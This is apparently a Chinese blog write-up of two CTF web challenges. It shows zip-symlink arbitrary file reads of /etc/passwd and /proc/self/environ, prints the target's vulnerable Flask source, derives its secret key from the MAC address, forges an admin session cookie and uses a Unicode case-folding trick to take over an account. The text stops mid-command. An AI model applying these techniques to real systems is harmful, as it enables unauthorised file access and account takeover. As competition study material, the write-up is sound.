id="handandseek"><a href="#handandseek" class="headerlink" title="handandseek"></a>handandseek</h3><p>上传 zip 文件，想到软连接任意文件读取，详情可见：<a href="http://www.vuln.cn/8132}" target="_blank" rel="noopener">http://www.vuln.cn/8132</a> </p><p>两个命令: <code>ln -s 要读的文件名 链接名</code>，<code>zip -y 压缩包名 链接名</code></p><p>可以用 python 写一个小的生成器，避免每次读都要输命令。</p><p>可以读 /etc/passwd，没有发现什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/false</span><br><span class="line">nginx:x:101:102:nginx user,,,:/nonexistent:/bin/false</span><br><span class="line">messagebus:x:102:103::/var/run/dbus:/bin/false</span><br></pre></td></tr></table></figure><p>读一下 /proc/self/environ ，发现了有用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=fa2af3bed43dSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</span><br></pre></td></tr></table></figure><p>配置文件 <code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code></p><p>根目录： <code>/app/hard_t0_guess_n9f5a95b5ku9fg</code></p><p>继续读配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main</span><br><span class="line">callable=app</span><br></pre></td></tr></table></figure><p><code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code> 是运行的文件。</p><p>第一天的时候这个 py 文件是个 html…脑洞？后来有 bug 下线了，再上线读一下就是正常的 py ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure><p>代码出现对 index.html 的渲染，读一下 index.html ，路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```html</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Message center&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;icon&quot; href=&quot;data:image/ico;base64,aWNv&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Bootstrap core CSS --&gt;</span><br><span class="line">    &lt;link href=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;nav class=&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;navbar-header&quot;&gt;</span><br><span class="line">          &lt;button type=&quot;button&quot; class=&quot;navbar-toggle collapsed&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbar&quot; aria-expanded=&quot;false&quot; aria-controls=&quot;navbar&quot;&gt;</span><br><span class="line">            &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt;</span><br><span class="line">            &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class="line">            &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class="line">            &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class="line">          &lt;/button&gt;</span><br><span class="line">          &lt;a class=&quot;navbar-brand&quot; href=&quot;/#&quot;&gt;Message center&lt;/a&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div id=&quot;navbar&quot; class=&quot;collapse navbar-collapse&quot;&gt;</span><br><span class="line">          &lt;ul class=&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">            &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;/#&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;#about&quot;&gt;About&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;#contact&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">          &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">          &#123;% if user %&#125;</span><br><span class="line">          &lt;div class=&quot;navbar-form navbar-right&quot;&gt;</span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">             &lt;li &gt;&lt;a href=&quot;#&quot;&gt;&#123;&#123; user  &#125;&#125;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">             &lt;li&gt;&lt;a href=&quot;logout&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          &#123;% else %&#125;</span><br><span class="line">          &lt;form class=&quot;navbar-form navbar-right&quot; action=&quot;login&quot; method=&quot;post&quot; &gt;</span><br><span class="line">            &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">              &lt;input type=&quot;text&quot; placeholder=&quot;username&quot; name=&quot;username&quot; class=&quot;form-control&quot;&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">              &lt;input type=&quot;password&quot; placeholder=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot;&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;button type=&quot;submit&quot; class=&quot;btn btn-success&quot;&gt;Sign in&lt;/button&gt;</span><br><span class="line">          &lt;/form&gt;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div id=&quot;navbar&quot; class=&quot;navbar-collapse collapse&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;!--/.nav-collapse --&gt;</span><br><span class="line"></span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot; &gt;</span><br><span class="line">      &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">      body &#123;</span><br><span class="line">        padding-top: 50px;</span><br><span class="line">      &#125;</span><br><span class="line">      .starter-template &#123;</span><br><span class="line">        padding: 40px 15px;</span><br><span class="line">        text-align: center;</span><br><span class="line">      &#125;</span><br><span class="line">      &lt;/style&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class=&quot;starter-template&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">        &#123;% if user %&#125;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;h1&gt;Hello, &#123;&#123; user &#125;&#125;. &lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">        &#123;% if user == &apos;admin&apos; %&#125;</span><br><span class="line">        Your flag: &lt;br&gt;</span><br><span class="line">        &#123;&#123; flag  &#125;&#125;</span><br><span class="line"></span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;h3&gt;I will tell you a secret, but you should upload a zipfile first.&lt;/h3&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;form action=&quot;/upload&quot; method=&quot;post&quot;</span><br><span class="line">        enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;the_file&quot;  /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;h1&gt;For more information, please login.&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;&lt;!-- /.container --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% if forbidden %&#125;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Sorry, you are not admin!&quot;)&lt;/script&gt;&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>是 admin 可以得到 flag，flag是从 flag.py import 的，那么尝试读 flag.py，发现返回不是 admin…</p><p>那么我们就需要 admin 登进去了，这里在代码看到 session 的 SECRET_KEY 生成方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><p>搜一下 uuid.getnode()，就可以知道这是返回主机的 mac 地址（十进制），所以我们如果想伪造 session，先要读一下 mac 地址，路径：<code>/sys/class/net/eth0/addressc</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12:34:3e:14:7c:62</span><br></pre></td></tr></table></figure><p>那么直接 python 生成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(int(<span class="string">"12343e147c62"</span>,<span class="number">16</span>))</span><br><span class="line">print(str(random.random()*<span class="number">100</span>))</span><br></pre></td></tr></table></figure><p>注意这里要用 python3，python2 和 python3 生成的结果不同，读 python 版本号可知是 python3，也可以两个都试一下。</p><p>得到结果： <strong>11.935137566861131</strong></p><p>然后有了 SECRET_KEY，拿到管理员的 session ，这里说下两种方法：</p><h4 id="本地运行拿-session"><a href="#本地运行拿-session" class="headerlink" title="本地运行拿 session"></a>本地运行拿 session</h4><p>代码里如果 admin 登录就跳转，我们可以本地把代码这部分改掉，然后 admin 登录拿 session，注意还要把 key 改了，如果不改就按照自己主机的 mac 地址生成了。</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-e5e23a31d005766f.png" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-7b00c128354c8751.png" alt="1542086603892.png"></p><p>我改了个print(1) </p><p>运行 main.py,访问 <a href="http://127.0.0.1:10008/" target="_blank" rel="noopener">http://127.0.0.1:10008/</a> 直接登录 admin（要仿照服务器那边放个 flag.py 保证正常登录）</p><p>拿 cookie：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c07bda3aadb01284.png" alt="image.png"></p><p>然后带着这个 cookie 去访问题目：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a40abfb778640ddf.png" alt="image.png"></p><p>得到 flag：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-0823ab97becca896.png" alt="image.png"></p><h4 id="直接伪造-session"><a href="#直接伪造-session" class="headerlink" title="直接伪造 session"></a>直接伪造 session</h4><p>现在我们已经拿到了 seesion 的 SECRET_KEY，可以借助工具直接生成 Flask 的 session，工具地址：</p><p><code>https://github.com/noraj/flask-session-cookie-manager</code></p><p>首先我们首先任意登一个用户，解密一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py decode -c &quot;eyJ1c2VybmFtZSI6ImdtbCJ9.DsvdsA.L4_AQuRKz_33D-JBWPEOdipSQTM&quot; -s &quot;11.935137566861131&quot;</span><br><span class="line">&#123;u&apos;username&apos;: u&apos;gml&apos;&#125;</span><br></pre></td></tr></table></figure><p>把名字改为 admin，生成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py encode -t &quot;&#123;u&apos;username&apos;: u&apos;admin&apos;&#125;&quot; -s &quot;11.935137566861131&quot;</span><br><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIn0.W-pMzA._Zbk3AcYcydsgX3W43l2ZQfD06I</span><br></pre></td></tr></table></figure><p>拿这个 session 也可以得到 flag。</p><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><h4 id="解法一、unicode编码绕过"><a href="#解法一、unicode编码绕过" class="headerlink" title="解法一、unicode编码绕过"></a>解法一、unicode编码绕过</h4><p>修改密码的源代码有github的地址，源码泄露： </p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-7e3f2e1daad9c4ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>下载到源码，发现在注册和改密码都包含有一个 <code>strlower</code> 的处理:</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-e8aab53a97319335.png" alt="image.png"></p><p>跟一下：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-631f89dbb4c7342f.png" alt="image.png"></p><p>这里两次进行小写转换可以越权修改 admin 的密码，详细可见 <a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">这篇</a></p><p>按照思路，先注册一个 ᴬdmin，然后登录：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-419f45ad3d020c15.png" alt="image.png"></p><p>经过<code>strlower</code> ，发现已经变成了正常的大写的 A。</p><p>然后我们修改密码，再用 admin 和修改后的密码进行登录：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-3f86da732a795a37.png" alt="image.png"></p><p>成功登入 admin。</p><h4 id="解法二、伪造-session"><a href="#解法二、伪造-session" class="headerlink" title="解法二、伪造 session"></a>解法二、伪造 session</h4><p>和上面的 handandseek 几乎一样，这里也是两种方法生成 session。</p><h5 id="工具生成："><a href="#工具生成：" class="headerlink" title="工具生成："></a>工具生成：</h5><p>详情见 handandseek 的过程，拿到普通用户的 session -&gt; 解密 -&gt; 用户名改为 admin -&gt; 登录</p><p>需要注意的是要用 python3 生成，2 和 3 有些差异，python2 登不进去。</p><p>我用 python3 也有时候登的上有时候登不上… 很迷，多试几次。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> py -3 session_cookie_manager.py decode -c 